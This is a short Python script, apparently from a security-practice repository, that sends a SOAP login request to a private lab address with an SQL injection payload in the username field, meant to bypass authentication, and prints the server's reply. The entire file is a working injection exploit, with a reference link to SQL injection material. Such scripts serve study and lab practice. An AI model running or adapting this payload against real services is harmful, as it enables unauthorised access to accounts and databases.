Keylogger/WebBasedExploits/SOAP_ATTACK.py

import requests

print("Payload for SOAP API ENDPOINT Attack (SQL INJECTION ATTACK)\n\r") 

payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><username>admin\' OR password LIKE \'FORTNITE_BALLS_ZINISKING\' -- </username><password>admin</password></LoginRequest></soap:Body></soap:Envelope>'
print(requests.post("http://10.129.102.101:3002/wsdl?wsdl", data=payload, headers={"SOAPAction":'"Login"'}).content)

# https://portswigger.net/web-security/sql-injection/union-attacks